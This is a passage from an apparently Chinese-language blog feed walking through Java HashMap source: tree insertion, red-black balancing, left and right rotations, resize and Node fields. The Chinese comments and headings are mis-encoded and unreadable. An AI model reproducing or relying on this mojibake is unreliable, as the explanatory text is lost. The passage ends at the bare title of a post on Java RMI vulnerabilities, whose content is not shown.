<span class="comment">// ä¸åŒç±»å‹çš„å¯¹å‘ç›´æ¥æ¯”è¾ƒå¤§å°è¿”å›-1æˆ–1</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span> ((kc == <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                                  (kc = comparableClassFor(k)) == <span class="literal">null</span>) ||</span><br><span class="line">                                 (dir = compareComparables(kc, k, pk)) == <span class="number">0</span>)</span><br><span class="line">                            <span class="comment">// ç±»å‹ç›¸åŒä½†æ˜¯k å’Œ pk æ—¶ä¸åŒçš„ä¸¤ä¸ªå¯¹è±¡ä»–ä»¬çš„ identityHashCode æ˜¯ä¸åŒçš„</span></span><br><span class="line">                            dir = tieBreakOrder(k, pk);</span><br><span class="line"></span><br><span class="line">                        TreeNode&lt;K,V&gt; xp = p;</span><br><span class="line">                        <span class="comment">// å¦‚æœdir å°äº0 åˆ™è¯æ˜å‰ä¸€èŠ‚ç‚¹æ¯”å½“å‰èŠ‚ç‚¹çš„hashå€¼è¦å¤§ å½“å‰èŠ‚ç‚¹å°±éœ€è¦æŒ‚åˆ°å‰ä¸€èŠ‚ç‚¹çš„å·¦å¶ä¸Š</span></span><br><span class="line">                        <span class="keyword">if</span> ((p = (dir &lt;= <span class="number">0</span>) ? p.left : p.right) == <span class="literal">null</span>) &#123;</span><br><span class="line">                            x.parent = xp;</span><br><span class="line">                            <span class="keyword">if</span> (dir &lt;= <span class="number">0</span>)</span><br><span class="line">                                xp.left = x;</span><br><span class="line">                            <span class="comment">// å¦åˆ™æŒ‚åˆ°å³å¶</span></span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                xp.right = x;</span><br><span class="line">                            <span class="comment">// æ ‘çš„è‡ªå¹³è¡¡</span></span><br><span class="line">                            root = balanceInsertion(root, x);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// å°†rootç§»åŠ¨åˆ°tabçš„ç¬¬ä¸€ä¸ªå…ƒç´ </span></span><br><span class="line">            moveRootToFront(tab, root);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h2 id="å¹³è¡¡çº¢é»‘æ ‘"><a href="#å¹³è¡¡çº¢é»‘æ ‘" class="headerlink" title="å¹³è¡¡çº¢é»‘æ ‘"></a>å¹³è¡¡çº¢é»‘æ ‘</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &lt;K,V&gt; TreeNode&lt;K,V&gt; <span class="title function_">balanceInsertion</span><span class="params">(TreeNode&lt;K,V&gt; root,</span></span><br><span class="line"><span class="params">                                                    TreeNode&lt;K,V&gt; x)</span> &#123;</span><br><span class="line">            <span class="comment">// å‡è®¾éœ€è¦æ’å…¥çš„èŠ‚ç‚¹æ˜¯çº¢è‰²</span></span><br><span class="line">            <span class="comment">// æ‰€æœ‰æ–°æ’å…¥èŠ‚ç‚¹å‡ä¸ºçº¢è‰²</span></span><br><span class="line">            x.red = <span class="literal">true</span>;</span><br><span class="line">            <span class="comment">//  xp x parent </span></span><br><span class="line">            <span class="comment">//  xpp  x parent parent</span></span><br><span class="line">            <span class="comment">// xppl xppr  left right</span></span><br><span class="line">            <span class="keyword">for</span> (TreeNode&lt;K,V&gt; xp, xpp, xppl, xppr;;) &#123;</span><br><span class="line">                <span class="comment">// é¦–å…ˆæˆ‘ä»¬ç›´åˆ°è¦è°ƒç”¨åˆ°balanceInsertion æ–¹æ³•  xè‚¯å®šä¸æ˜¯æ ‘åŒ–çš„èµ·å§‹èŠ‚ç‚¹</span></span><br><span class="line">                <span class="comment">// é‚£ä¹ˆæ­£å¸¸æ¡ä»¶ä¸‹x çš„çˆ¶èŠ‚ç‚¹ä¸ºç©ºçš„æƒ…å†µæ˜¯ä¸å¯èƒ½å‡ºç°çš„</span></span><br><span class="line">                <span class="comment">// æ‰€ä»¥è¿™ä¸ªåˆ¤æ–­çš„æ„ä¹‰æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ </span></span><br><span class="line">                <span class="comment">//  å·¦æ—‹å³æ—‹å¹³è¡¡çš„æ—¶å€™ ä¼šä¾æ¬¡å‘ä¸Šå¯»æ‰¾  å¦‚æœç¢°åˆ°å˜è‰²æ—‹è½¬å çˆ¶èŠ‚ç‚¹ä¸ºç©ºåˆ™è¯æ˜å½“å‰èŠ‚ç‚¹æ—¶æ ¹èŠ‚ç‚¹äº† å°†å½“å‰èŠ‚ç‚¹çš„é¢œè‰²å˜ä¸ºé»‘è‰²é€€å‡ºã€‚</span></span><br><span class="line">                <span class="keyword">if</span> ((xp = x.parent) == <span class="literal">null</span>) &#123;</span><br><span class="line">                    x.red = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">return</span> x;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// å¦‚æœxçš„çˆ¶èŠ‚ç‚¹ä¸æ˜¯çº¢è‰²å³çˆ¶èŠ‚ç‚¹ä¸ºé»‘è‰² æˆ–è€…çˆ¶èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ä¸ºnull å³xæ˜¯ä»æ ¹èŠ‚ç‚¹å‘ä¸‹ç¬¬äºŒå±‚</span></span><br><span class="line">                <span class="comment">// æ­¤æ—¶æ ¹èŠ‚ç‚¹ä¸å˜ ç›´æ¥è¿”å›</span></span><br><span class="line">                <span class="comment">// åªæœ‰ä¸¤å±‚å°±æ²¡æœ‰å¹³è¡¡çš„å¿…è¦äº†</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (!xp.red || (xpp = xp.parent) == <span class="literal">null</span>)</span><br><span class="line">                    <span class="comment">// </span></span><br><span class="line">                    <span class="keyword">return</span> root;</span><br><span class="line">                <span class="comment">// å½“å­˜åœ¨ä¸‰å±‚çš„æ—¶å€™</span></span><br><span class="line">                <span class="comment">// å¦‚æœxçš„çˆ¶èŠ‚ç‚¹ä¸ºå…¶ç¥–çˆ¶èŠ‚ç‚¹çš„å·¦å¶</span></span><br><span class="line">                <span class="keyword">if</span> (xp == (xppl = xpp.left)) &#123;</span><br><span class="line">                    <span class="comment">// å¦‚æœç¥–çˆ¶èŠ‚ç‚¹çš„å³å¶ä¸ä¸ºç©º  ä¸” å³å¶çš„é¢œè‰²ä¸ºçº¢è‰²   é‚£ä¹ˆå…¶çˆ¶èŠ‚ç‚¹å¿…å®šä¸ºé»‘è‰²  çˆ¶èŠ‚ç‚¹çš„å·¦å¶å¯çº¢å¯é»‘</span></span><br><span class="line">                    <span class="comment">// æ­¤æ—¶å› ä¸ºä¸Šä¸€ä¸ªelse if çš„åŸå›  å…¶çˆ¶èŠ‚ç‚¹è‚¯å®šæ˜¯çº¢è‰²</span></span><br><span class="line">                    <span class="comment">// ç¥–çˆ¶èŠ‚ç‚¹æ˜¯é»‘è‰²  çˆ¶èŠ‚ç‚¹æ˜¯çº¢è‰²  å”å”èŠ‚ç‚¹æ˜¯çº¢è‰² ä¸æ»¡è¶³çº¢é»‘æ ‘è§„åˆ™ä¸èƒ½å‡ºç°ä¸¤ä¸ªè¿ç»­çš„çº¢è‰² </span></span><br><span class="line">                    <span class="comment">// æ‰€ä»¥è¿›è¡Œå˜è‰²  çˆ¶èŠ‚ç‚¹ä»¥åŠå”å”èŠ‚ç‚¹å˜æˆé»‘è‰² ç¥–çˆ¶èŠ‚ç‚¹å˜æˆçº¢è‰²</span></span><br><span class="line">                    <span class="keyword">if</span> ((xppr = xpp.right) != <span class="literal">null</span> &amp;&amp; xppr.red) &#123;</span><br><span class="line">                        xppr.red = <span class="literal">false</span>; <span class="comment">// å³å¶è®¾ä¸ºé»‘è‰²</span></span><br><span class="line">                        xp.red = <span class="literal">false</span>; <span class="comment">// å·¦å¶è®¾ä¸ºé»‘è‰²</span></span><br><span class="line">                        xpp.red = <span class="literal">true</span>; <span class="comment">// ç¥–çˆ¶èŠ‚ç‚¹å˜æˆçº¢è‰²</span></span><br><span class="line">                        <span class="comment">// å°†ç¥–çˆ¶èŠ‚ç‚¹è®¾ä¸º å½“å‰èŠ‚ç‚¹  ç»§ç»­å¾ªç¯ å¾ªç¯æ—¶è·å–ç¥–çˆ¶èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ä»¥åŠç¥–çˆ¶èŠ‚ç‚¹ é‡å¤ </span></span><br><span class="line">                        <span class="comment">// ç›´åˆ°æ»¡è¶³é€€å‡ºæ¡ä»¶   å…¶ä¸€ å½“å‰èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ä¸ºç©º</span></span><br><span class="line">                        x = xpp;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// ç¥–çˆ¶èŠ‚ç‚¹çš„å³å­å¶ä¸ºç©º</span></span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">// å½“å‰èŠ‚ç‚¹æ—¶çˆ¶èŠ‚ç‚¹çš„å³å­å¶</span></span><br><span class="line">                        <span class="comment">// å½“å‰èŠ‚ç‚¹ çº¢è‰²  çˆ¶èŠ‚ç‚¹çº¢è‰²  ç¥–çˆ¶èŠ‚ç‚¹ä¸ºé»‘è‰²</span></span><br><span class="line">                        <span class="comment">//  ä¸æ»¡è¶³ä¸èƒ½å‡ºç°ä¸¤ä¸ªè¿ç»­çš„çº¢è‰²çš„è§„åˆ™   ä½†æ˜¯å…¶å”å”èŠ‚ç‚¹åˆä¸ºç©º(é»‘è‰²)  æ•…ä¸éœ€è¦å˜è‰² ç›´æ¥è¿›è¡Œå·¦æ—‹</span></span><br><span class="line">                        <span class="comment">// è¿™ç§æƒ…å†µåˆ†ä¸¤æ­¥å®Œæˆ å…ˆè¦è¿›è¡Œå·¦æ—‹  å·¦æ—‹å®Œæˆå  å½“å‰èŠ‚ç‚¹æ˜¯å˜æˆæ–°çš„çˆ¶èŠ‚ç‚¹  åŸæœ¬çš„çˆ¶èŠ‚ç‚¹å˜æˆæ–°çš„çˆ¶èŠ‚ç‚¹çš„å·¦å­å¶</span></span><br><span class="line">                        <span class="comment">// æ­¤æ—¶ä»ç„¶å­˜åœ¨ä¸¤ä¸ªè¿ç»­çš„çº¢è‰²èŠ‚ç‚¹  ä½†æ˜¯æ­¤æ—¶æ–°çš„åšä¸‹å±‚å­èŠ‚ç‚¹å˜æˆçˆ¶èŠ‚ç‚¹çš„å·¦å¶äº†  å¯ä»¥è¿›è¡Œå³æ—‹äº†</span></span><br><span class="line">                        <span class="keyword">if</span> (x == xp.right) &#123;</span><br><span class="line">                            <span class="comment">// å…ˆè¿›è¡Œå·¦æ—‹</span></span><br><span class="line">                            root = rotateLeft(root, x = xp);</span><br><span class="line">                            xpp = (xp = x.parent) == <span class="literal">null</span> ? <span class="literal">null</span> : xp.parent;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// å¦‚æœæ˜¯å½“å‰èŠ‚ç‚¹æ˜¯çˆ¶èŠ‚ç‚¹çš„åå­å¶  ç›´æ¥è¿›è¡Œå³æ—‹</span></span><br><span class="line">                        <span class="keyword">if</span> (xp != <span class="literal">null</span>) &#123;</span><br><span class="line">                            xp.red = <span class="literal">false</span>; <span class="comment">// çˆ¶èŠ‚ç‚¹å˜é»‘</span></span><br><span class="line">                            <span class="keyword">if</span> (xpp != <span class="literal">null</span>) &#123;</span><br><span class="line">                                xpp.red = <span class="literal">true</span>; <span class="comment">// çˆ·çˆ·èŠ‚ç‚¹å˜çº¢</span></span><br><span class="line">                                <span class="comment">// å³æ—‹</span></span><br><span class="line">                                root = rotateRight(root, xpp);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// xçš„çˆ¶èŠ‚ç‚¹ä¸ºå…¶ç¥–çˆ¶èŠ‚ç‚¹çš„å³å¶</span></span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// å”å”èŠ‚ç‚¹ä¸ä¸ºç©ºä¸”ä¸ºçº¢è‰²</span></span><br><span class="line">                    <span class="comment">// å”å”èŠ‚ç‚¹ä¸çˆ¶èŠ‚ç‚¹å‡ä¸ºçº¢è‰²  å­èŠ‚ç‚¹ä¹Ÿä¸ºçº¢è‰²  ç¥–çˆ¶èŠ‚ç‚¹ä¸ºé»‘è‰²</span></span><br><span class="line">                    <span class="comment">// å…ˆå˜è‰²  çˆ¶èŠ‚ç‚¹ä¸å”å”å˜é»‘   ç¥–çˆ¶èŠ‚ç‚¹å˜çº¢</span></span><br><span class="line">                    <span class="keyword">if</span> (xppl != <span class="literal">null</span> &amp;&amp; xppl.red) &#123;</span><br><span class="line">                        xppl.red = <span class="literal">false</span>; <span class="comment">// å”å”å˜é»‘</span></span><br><span class="line">                        xp.red = <span class="literal">false</span>; <span class="comment">// çˆ¶äº²è¾¹é»‘</span></span><br><span class="line">                        xpp.red = <span class="literal">true</span>; <span class="comment">// ç¥–çˆ¶å˜çº¢</span></span><br><span class="line">                        <span class="comment">// å¼€å¯æ–°ä¸€è½®çš„å¾ªç¯</span></span><br><span class="line">                        x = xpp;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// å”å”èŠ‚ç‚¹ä¸å­˜åœ¨</span></span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">// å¦‚æœå½“å‰èŠ‚ç‚¹æ˜¯çˆ¶èŠ‚ç‚¹çš„å·¦å­å¶  å…ˆè¿›è¡Œå³æ—‹å†å·¦æ—‹</span></span><br><span class="line">                        <span class="keyword">if</span> (x == xp.left) &#123;</span><br><span class="line">                            <span class="comment">// å³æ—‹</span></span><br><span class="line">                            root = rotateRight(root, x = xp);</span><br><span class="line">                            xpp = (xp = x.parent) == <span class="literal">null</span> ? <span class="literal">null</span> : xp.parent;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// å·¦æ—‹  å› ä¸ºå­˜åœ¨è¿ä¸ªè¿ç»­çš„çº¢è‰² å…ˆè¿›è¡Œå˜è‰²</span></span><br><span class="line">                        <span class="keyword">if</span> (xp != <span class="literal">null</span>) &#123;</span><br><span class="line">                            xp.red = <span class="literal">false</span>; <span class="comment">// çˆ¶èŠ‚ç‚¹å˜é»‘</span></span><br><span class="line">                            <span class="keyword">if</span> (xpp != <span class="literal">null</span>) &#123;</span><br><span class="line">                                xpp.red = <span class="literal">true</span>; <span class="comment">// ç¥–çˆ¶èŠ‚ç‚¹å˜çº¢</span></span><br><span class="line">                                root = rotateLeft(root, xpp);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h3 id="å·¦æ—‹"><a href="#å·¦æ—‹" class="headerlink" title="å·¦æ—‹"></a>å·¦æ—‹</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &lt;K,V&gt; TreeNode&lt;K,V&gt; <span class="title function_">rotateLeft</span><span class="params">(TreeNode&lt;K,V&gt; root,</span></span><br><span class="line"><span class="params">                                              TreeNode&lt;K,V&gt; p)</span> &#123;</span><br><span class="line">            TreeNode&lt;K,V&gt; r, pp, rl;</span><br><span class="line">            <span class="comment">// ä»¥å½“å‰èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ä¸ºè½´è¿›è¡Œæ—‹è½¬ å³p</span></span><br><span class="line">            <span class="comment">// å°†pçš„å³èŠ‚ç‚¹å–å‡ºæ¥ èµ‹å€¼ç»™r</span></span><br><span class="line">            <span class="keyword">if</span> (p != <span class="literal">null</span> &amp;&amp; (r = p.right) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// å°†rçš„å·¦èŠ‚ç‚¹èµ‹å€¼ç»™pçš„å³èŠ‚ç‚¹  pæ˜¯è‚¯å®šå°äºrçš„å­èŠ‚ç‚¹çš„  æ‰€ä»¥æ˜¯å°†rçš„å­èŠ‚ç‚¹èµ‹å€¼ç»™pçš„å³èŠ‚ç‚¹</span></span><br><span class="line">                <span class="keyword">if</span> ((rl = p.right = r.left) != <span class="literal">null</span>)</span><br><span class="line">                    <span class="comment">// rçš„å·¦èŠ‚ç‚¹æŒ‡å‘æ–°çš„çˆ¶èŠ‚ç‚¹ p</span></span><br><span class="line">                    rl.parent = p;</span><br><span class="line">                <span class="comment">// å› ä¸ºrçš„ä½ç½®ä¼šè¢«æå‡ æ­¤æ—¶på˜æˆrçš„å­èŠ‚ç‚¹æ‰€ä»¥ pçš„çˆ¶èŠ‚ç‚¹å˜æˆrçš„çˆ¶èŠ‚ç‚¹</span></span><br><span class="line">                <span class="keyword">if</span> ((pp = r.parent = p.parent) == <span class="literal">null</span>)</span><br><span class="line">                    <span class="comment">// å¦‚æœpæ²¡æœ‰çˆ¶èŠ‚ç‚¹ pæœ¬èº«å°±æ˜¯æ ¹èŠ‚ç‚¹äº†  på¿…é¡»ä¸ºé»‘è‰²</span></span><br><span class="line">                    (root = r).red = <span class="literal">false</span>;</span><br><span class="line">                <span class="comment">// å¦‚æœpæœ‰çˆ¶èŠ‚ç‚¹  ä¸”pæ˜¯å…¶çˆ¶èŠ‚ç‚¹çš„åå­å¶</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (pp.left == p)</span><br><span class="line">                    <span class="comment">// ç›´æ¥è®¾ç½® ppçš„å·¦å­å¶ä¸ºr</span></span><br><span class="line">                    pp.left = r;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="comment">// å¦‚æœæ˜¯å³å­å¶  åˆ™è®¾ç½®rä¸ºå³å­å¶</span></span><br><span class="line">                    pp.right = r;</span><br><span class="line">                <span class="comment">// å·¦æ—‹å˜›  è®¾ç½®pä¸ºrçš„å·¦å­å¶</span></span><br><span class="line">                r.left = p;</span><br><span class="line">                <span class="comment">// pçš„çˆ¶èŠ‚ç‚¹ä¸ºr</span></span><br><span class="line">                p.parent = r;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// å®Œæˆ</span></span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h3 id="å³æ—‹"><a href="#å³æ—‹" class="headerlink" title="å³æ—‹"></a>å³æ—‹</h3><p>å³æ—‹å’Œå·¦æ—‹å·®ä¸å¤š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &lt;K,V&gt; TreeNode&lt;K,V&gt; <span class="title function_">rotateRight</span><span class="params">(TreeNode&lt;K,V&gt; root,</span></span><br><span class="line"><span class="params">                                               TreeNode&lt;K,V&gt; p)</span> &#123;</span><br><span class="line">            TreeNode&lt;K,V&gt; l, pp, lr;</span><br><span class="line">            <span class="keyword">if</span> (p != <span class="literal">null</span> &amp;&amp; (l = p.left) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((lr = p.left = l.right) != <span class="literal">null</span>)</span><br><span class="line">                    lr.parent = p;</span><br><span class="line">                <span class="keyword">if</span> ((pp = l.parent = p.parent) == <span class="literal">null</span>)</span><br><span class="line">                    (root = l).red = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (pp.right == p)</span><br><span class="line">                    pp.right = l;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    pp.left = l;</span><br><span class="line">                l.right = p;</span><br><span class="line">                p.parent = l;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h1 id="æ‰©å®¹"><a href="#æ‰©å®¹" class="headerlink" title="æ‰©å®¹"></a>æ‰©å®¹</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> Node&lt;K,V&gt;[] resize() &#123;</span><br><span class="line">        Node&lt;K,V&gt;[] oldTab = table;</span><br><span class="line">        <span class="comment">// åŸè¡¨ä¸ºç©º  newå®Œåå°±æ˜¯ç©ºçš„ </span></span><br><span class="line">        <span class="type">int</span> <span class="variable">oldCap</span> <span class="operator">=</span> (oldTab == <span class="literal">null</span>) ? <span class="number">0</span> : oldTab.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">oldThr</span> <span class="operator">=</span> threshold;</span><br><span class="line">        <span class="comment">// æ–°è¡¨å®¹é‡ä»¥åŠæ‰©å®¹é˜ˆå€¼</span></span><br><span class="line">        <span class="type">int</span> newCap, newThr = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// åŸè¡¨é•¿åº¦å¤§äº0</span></span><br><span class="line">        <span class="keyword">if</span> (oldCap &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// åŸè¡¨å·²ç»æ˜¯æœ€å¤§å€¼äº†  ä¸æ‰©å®¹  ç›´æ¥è¿”å›</span></span><br><span class="line">            <span class="keyword">if</span> (oldCap &gt;= MAXIMUM_CAPACITY) &#123;</span><br><span class="line">                threshold = Integer.MAX_VALUE;</span><br><span class="line">                <span class="keyword">return</span> oldTab;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// åŸè¡¨å®¹é‡æ‰©å¤§ä¸€å€ å¦‚æœå°äºæœ€å¤§å®¹é‡ä¸”åŸè¡¨å®¹é‡å¤§äºç­‰äºé»˜è®¤å®¹é‡</span></span><br><span class="line">            <span class="comment">// æ–°è¡¨é˜ˆå€¼åŒæ¯”æ‰©å¤§ä¸€å€</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((newCap = oldCap &lt;&lt; <span class="number">1</span>) &lt; MAXIMUM_CAPACITY &amp;&amp;</span><br><span class="line">                     oldCap &gt;= DEFAULT_INITIAL_CAPACITY)</span><br><span class="line">                newThr = oldThr &lt;&lt; <span class="number">1</span>; <span class="comment">// double threshold</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// å¦‚æœåŸè¡¨å®¹é‡å°äºç­‰äº0 ä¸”åŸè¡¨çš„é˜ˆå€¼å¤§äº0</span></span><br><span class="line">        <span class="comment">// æ–°çš„å®¹é‡ä¸ºåŸè¡¨çš„é˜ˆå€¼</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (oldThr &gt; <span class="number">0</span>) <span class="comment">// initial capacity was placed in threshold</span></span><br><span class="line">            newCap = oldThr;</span><br><span class="line">        <span class="comment">// åŸè¡¨çš„å®¹é‡ç­‰äº0</span></span><br><span class="line">        <span class="keyword">else</span> &#123;               <span class="comment">// zero initial threshold signifies using defaults</span></span><br><span class="line">            newCap = DEFAULT_INITIAL_CAPACITY;</span><br><span class="line">            newThr = (<span class="type">int</span>)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// æ–°è¡¨é˜ˆå€¼ç­‰äºé›¶ é€šè¿‡å…¬å¼è®¡ç®—æ–°çš„é˜ˆå€¼</span></span><br><span class="line">        <span class="keyword">if</span> (newThr == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)newCap * loadFactor;</span><br><span class="line">            newThr = (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (<span class="type">float</span>)MAXIMUM_CAPACITY ?</span><br><span class="line">                      (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">        &#125;</span><br><span class="line">        threshold = newThr;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        Node&lt;K,V&gt;[] newTab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[newCap];</span><br><span class="line">        table = newTab;</span><br><span class="line">        <span class="keyword">if</span> (oldTab != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// éå†åŸè¡¨</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; oldCap; ++j) &#123;</span><br><span class="line">                Node&lt;K,V&gt; e;</span><br><span class="line">                <span class="keyword">if</span> ((e = oldTab[j]) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    oldTab[j] = <span class="literal">null</span>;</span><br><span class="line">                    <span class="comment">// å¦‚æœåŸè¡¨çš„æŸä¸€ä¸ªä½ç½®åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹ åˆ™ç›´æ¥å°†è¿™ä¸ªèŠ‚ç‚¹é‡æ–°è®¡ç®—ç´¢å¼•æ”¾åˆ°æ–°è¡¨ä¸­</span></span><br><span class="line">                    <span class="keyword">if</span> (e.next == <span class="literal">null</span>)</span><br><span class="line">                        newTab[e.hash &amp; (newCap - <span class="number">1</span>)] = e;</span><br><span class="line">                    <span class="comment">// å¦‚æœæ˜¯çº¢é»‘æ ‘ åˆ™è¿›è¡Œå•ç‹¬å¤„ç†</span></span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                        ((TreeNode&lt;K,V&gt;)e).split(<span class="built_in">this</span>, newTab, j, oldCap);</span><br><span class="line">                    <span class="keyword">else</span> &#123; <span class="comment">// preserve order</span></span><br><span class="line">                        Node&lt;K,V&gt; loHead = <span class="literal">null</span>, loTail = <span class="literal">null</span>;</span><br><span class="line">                        Node&lt;K,V&gt; hiHead = <span class="literal">null</span>, hiTail = <span class="literal">null</span>;</span><br><span class="line">                        Node&lt;K,V&gt; next;</span><br><span class="line">                        <span class="keyword">do</span> &#123;</span><br><span class="line">                            next = e.next;</span><br><span class="line">                            <span class="comment">// åŒºåˆ†hashä½äºæ–°è¡¨çš„é«˜ä½è¿˜æ˜¯ä½ä½</span></span><br><span class="line">                            <span class="comment">// å› ä¸º æ–°è¡¨çš„å®¹é‡æ€»æ˜¯åŸè¡¨çš„2æ¬¡å¹‚ï¼Œæ‰€ä»¥åŸè¡¨æŸä¸€ç´¢å¼•ä½ç½®çš„é“¾è¡¨ä¸­çš„èŠ‚ç‚¹å†æ–°è¡¨ä¸­</span></span><br><span class="line">                            <span class="comment">// è¦ä¹ˆä½äº åŸæ¥çš„ä½ç½®  è¦ä¹ˆä½äºåŸæ¥çš„ä½ç½®åŠ åŸè¡¨çš„å®¹é‡ å¾—åˆ°çš„æ–°çš„ä½ç½®</span></span><br><span class="line">                            <span class="comment">// è¿™äº›ç»“æœä½äºåŸè¡¨åŒä¸€ç´¢å¼•ä½ç½®</span></span><br><span class="line">                            <span class="keyword">if</span> ((e.hash &amp; oldCap) == <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (loTail == <span class="literal">null</span>)</span><br><span class="line">                                    loHead = e;</span><br><span class="line">                                <span class="keyword">else</span></span><br><span class="line">                                    loTail.next = e;</span><br><span class="line">                                loTail = e;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="comment">// ä½äºåŸè¡¨ç´¢å¼•+åŸè¡¨å®¹é‡çš„ä½ç½®</span></span><br><span class="line">                            <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">if</span> (hiTail == <span class="literal">null</span>)</span><br><span class="line">                                    hiHead = e;</span><br><span class="line">                                <span class="keyword">else</span></span><br><span class="line">                                    hiTail.next = e;</span><br><span class="line">                                hiTail = e;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">while</span> ((e = next) != <span class="literal">null</span>);</span><br><span class="line">                        <span class="keyword">if</span> (loTail != <span class="literal">null</span>) &#123;</span><br><span class="line">                            loTail.next = <span class="literal">null</span>;</span><br><span class="line">                            newTab[j] = loHead;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (hiTail != <span class="literal">null</span>) &#123;</span><br><span class="line">                            hiTail.next = <span class="literal">null</span>;</span><br><span class="line">                            newTab[j + oldCap] = hiHead;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> newTab;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h1 id="Nodeä¸TreeNode"><a href="#Nodeä¸TreeNode" class="headerlink" title="Nodeä¸TreeNode"></a>Nodeä¸TreeNode</h1><p>Nodeå¯¹è±¡è¡¨ç¤ºä¸€ä¸ªé“¾è¡¨èŠ‚ç‚¹ï¼Œå…¶åŒ…å«4ä¸ªå…³é”®æˆå‘˜å˜é‡åˆ†åˆ«ä¸º </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">int</span> hash; <span class="comment">// keyçš„hashå€¼</span></span><br><span class="line"><span class="keyword">final</span> K key; <span class="comment">// key</span></span><br><span class="line">V value; <span class="comment">// value</span></span><br><span class="line">Node&lt;K,V&gt; next; <span class="comment">// ä¸‹ä¸€ä¸ªèŠ‚ç‚¹</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>HashMap</tag>
      </tags>
  </entry>
  <entry>
    <title>ä»å¤´å¼€å§‹æŒ–æ˜Java RMIæ¼æ´</title>
    <url>/archives/b83d1f32.html</url>
